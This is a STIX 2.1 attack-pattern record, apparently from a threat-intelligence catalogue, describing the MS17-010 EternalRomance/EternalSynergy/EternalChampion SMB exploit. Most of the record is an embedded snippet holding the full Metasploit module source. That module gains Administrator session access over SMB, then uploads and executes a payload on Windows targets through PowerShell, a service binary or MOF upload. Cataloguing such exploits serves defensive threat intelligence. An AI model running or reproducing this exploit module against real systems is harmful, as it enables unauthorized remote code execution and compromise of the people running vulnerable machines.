{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f79c73b0-8b67-4dbd-88fc-57005c9890cb",
    "created": "2024-08-14T16:56:32.882745Z",
    "modified": "2024-08-14T16:56:32.88275Z",
    "name": "MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution",
    "description": " This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec payload code execution is done.  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a named pipe. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms17_010_psexec.rb",
            "external_id": "ms17_010_psexec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/worawit/MS17-010"
        },
        {
            "source_name": "reference",
            "url": "https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Windows XP systems that are not part of a domain default to treating all\n# network logons as if they were Guest. This prevents SMB relay attacks from\n# gaining administrative access to these systems. This setting can be found\n# under:\n#\n#  Local Security Settings >\n#   Local Policies >\n#    Security Options >\n#     Network Access: Sharing and security model for local accounts\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010\n  include Msf::Exploit::Remote::SMB::Client::Psexec\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution',\n      'Description'    => %q{\n        This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where\n        primitive. This will then be used to overwrite the connection session information with as an\n        Administrator session. From there, the normal psexec payload code execution is done.\n\n        Exploits a type confusion between Transaction and WriteAndX requests and a race condition in\n        Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy\n        exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a\n        named pipe.\n      },\n      'Author'         =>\n        [\n          'sleepya',          # zzz_exploit idea and offsets\n          'zerosum0x0',\n          'Shadow Brokers',\n          'Equation Group'\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'CheckModule' => 'auxiliary/scanner/smb/smb_ms17_010',\n          'WfsDelay' => 10\n        },\n      'References'     =>\n        [\n          [ 'MSB', 'MS17-010' ],\n          [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests\n          [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests\n          [ 'CVE', '2017-0147'], # for EternalRomance reference\n          [ 'URL', 'https://github.com/worawit/MS17-010' ],\n          [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],\n          [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'        => 3072,\n          'DisableNops'  => true\n        },\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'PowerShell', { } ],\n          [ 'Native upload', { } ],\n          [ 'MOF upload', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-03-14',\n      'Notes' =>\n          {\n              'AKA' => [\n                  'ETERNALSYNERGY',\n                  'ETERNALROMANCE',\n                  'ETERNALCHAMPION',\n                  'ETERNALBLUE'      # does not use any CVE from Blue, but Search should show this, it is preferred\n              ]\n          }\n    ))\n\n    register_options(\n      [\n        OptString.new('SHARE',     [ true, \"The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\", 'ADMIN$' ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ALLOW_GUEST', [true, \"Keep trying if only given guest access\", false]),\n        OptString.new('SERVICE_FILENAME', [false, \"Filename to to be used on target for the service binary\",nil]),\n        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe']),\n        OptString.new('SERVICE_STUB_ENCODER', [false, \"Encoder to use around the service registering stub\",nil])\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def validate_service_stub_encoder!\n    service_encoder = datastore['SERVICE_STUB_ENCODER']\n    return if service_encoder.nil? || service_encoder.empty?\n\n    encoder = framework.encoders[service_encoder]\n    if encoder.nil?\n      raise Msf::OptionValidateError.new(\n        {\n          'SERVICE_STUB_ENCODER' => \"Failed to find encoder #{service_encoder.inspect}\"\n        }\n      )\n    end\n  end\n\n  def exploit\n    validate_service_stub_encoder!\n\n    begin\n      if datastore['SMBUser'].present?\n        print_status(\"Authenticating to #{datastore['RHOST']} as user '#{splitname(datastore['SMBUser'])}'...\")\n      end\n      eternal_pwn(datastore['RHOST'])\n      smb_pwn()\n\n    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e\n      print_error(\"#{e.message}\")\n    rescue ::Errno::ECONNRESET,\n           ::Rex::Proto::SMB::Exceptions::LoginError,\n           ::Rex::HostUnreachable,\n           ::Rex::ConnectionTimeout,\n           ::Rex::ConnectionRefused  => e\n      print_error(\"#{e.class}: #{e.message}\")\n    rescue => error\n      print_error(error.class.to_s)\n      print_error(error.message)\n      print_error(error.backtrace.join(\"\\n\"))\n    ensure\n      eternal_cleanup()       # restore session\n    end\n  end\n\n  def smb_pwn\n    service_filename = datastore['SERVICE_FILENAME'] || \"#{rand_text_alpha(8)}.exe\"\n    service_encoder = datastore['SERVICE_STUB_ENCODER'] || ''\n\n    case target.name\n    when 'Automatic'\n      if powershell_installed?(datastore['SHARE'], datastore['PSH_PATH'])\n        print_status('Selecting PowerShell target')\n        execute_powershell_payload\n      else\n        print_status('Selecting native target')\n        native_upload(datastore['SHARE'], service_filename, service_encoder)\n      end\n    when 'PowerShell'\n      execute_powershell_payload\n    when 'Native upload'\n      native_upload(datastore['SHARE'], service_filename, service_encoder)\n    when 'MOF upload'\n      mof_upload(datastore['SHARE'])\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-14",
    "x_mitre_platforms": [
        "win'"
    ]
}